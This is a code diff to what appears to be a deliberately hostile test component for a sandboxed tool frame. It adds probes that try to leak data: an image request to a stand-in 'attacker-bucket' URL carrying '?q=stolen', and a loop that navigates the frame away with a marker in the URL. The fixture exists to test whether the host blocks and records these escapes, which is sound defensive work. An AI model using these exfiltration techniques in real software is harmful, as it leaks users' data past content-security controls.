@@ -31,6 +31,19 @@ const UNDECLARED_NOTE = 'people/index.md'
 /** A host the frame is not allowed to reach by any means. */
 const EVIL_ORIGIN = 'https://example.com'
 
+/**
+ * A public bucket on the storage host the media bucket lives on — anyone can
+ * own one. `img-src` must name the app's media path, never the whole host.
+ */
+const FOREIGN_BUCKET = 'https://storage.googleapis.com/attacker-bucket'
+
+/**
+ * The note the suite writes when it wants this Tool to try its last escape:
+ * navigating its own frame, with data in the URL. Inside the declared
+ * `hostile/**`, so the Tool can watch for it.
+ */
+const LEAVE_NOTE = 'hostile/leave.md'
+
 /** The id on the forged `visvine:call`, so its result can be told from a real one. */
 const FORGED_ID = 'forged-visvine-call'
 
@@ -168,14 +181,14 @@ async function probeCrossOriginFetch(): Promise<Probe> {
  * else, so the load must fail; the element is deliberately never appended, so
  * its error event cannot reach the frame runtime's `window` handler.
  */
-function probeImage(): Promise<Probe> {
+function probeImage(src: string = `${EVIL_ORIGIN}/pixel.png?q=stolen`): Promise<Probe> {
   return within(
     new Promise<Probe>((resolve) => {
       try {
         const img = new Image()
         img.onload = () => resolve({ outcome: 'loaded' })
         img.onerror = () => resolve({ outcome: 'error' })
-        img.src = `${EVIL_ORIGIN}/pixel.png?q=stolen`
+        img.src = src
       } catch (e) {
         resolve({ outcome: 'threw', error: describe(e) })
       }
@@ -282,6 +295,7 @@ export default function Hostile() {
         results.sessionFetch = await probeSessionFetch()
         results.crossOriginFetch = await probeCrossOriginFetch()
         results.image = await probeImage()
+        results.bucketImage = await probeImage(`${FOREIGN_BUCKET}/pixel.png?q=stolen`)
         results.forgedCall = await probeForgedCall()
 
         // The undeclared read, asked for politely through the SDK this time —
@@ -310,6 +324,20 @@ export default function Hostile() {
         setReported('reported')
       } catch (e) {
         setReported(describe(e))
+      }
+
+      // The last escape, on the suite's word: navigate this frame away with
+      // data in the URL — the one channel CSP cannot close. The host must take
+      // the frame down and record it.
+      for (;;) {
+        await new Promise((resolve) => setTimeout(resolve, 1_000))
+        try {
+          await visvine.context.read(LEAVE_NOTE)
+        } catch {
+          continue
+        }
+        window.location.href = `${window.location.origin}/api/tools/runtime/frame?left=${encodeURIComponent(MARKER)}`
+        return
       }
     })()
   }, [visvine])
